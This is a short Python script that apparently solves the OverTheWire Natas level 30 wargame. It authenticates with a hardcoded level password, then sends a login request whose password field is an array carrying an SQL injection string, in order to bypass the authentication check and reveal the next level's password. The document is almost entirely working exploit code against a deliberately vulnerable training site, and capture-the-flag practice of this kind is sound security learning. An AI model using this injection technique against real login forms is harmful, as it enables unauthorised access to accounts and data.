import requests, base64

url = "http://natas30.natas.labs.overthewire.org"
s = requests.Session()
s.auth=('natas30','wie9iexae0Daihohv8vuu3cei9wahf0e')
source='http://natas30.natas.labs.overthewire.org/index-source.html'
#use array injection
data={'username':'natas31','password': ["'' or 1", 2]}
r=s.post(url,data=data)
print(r.text)
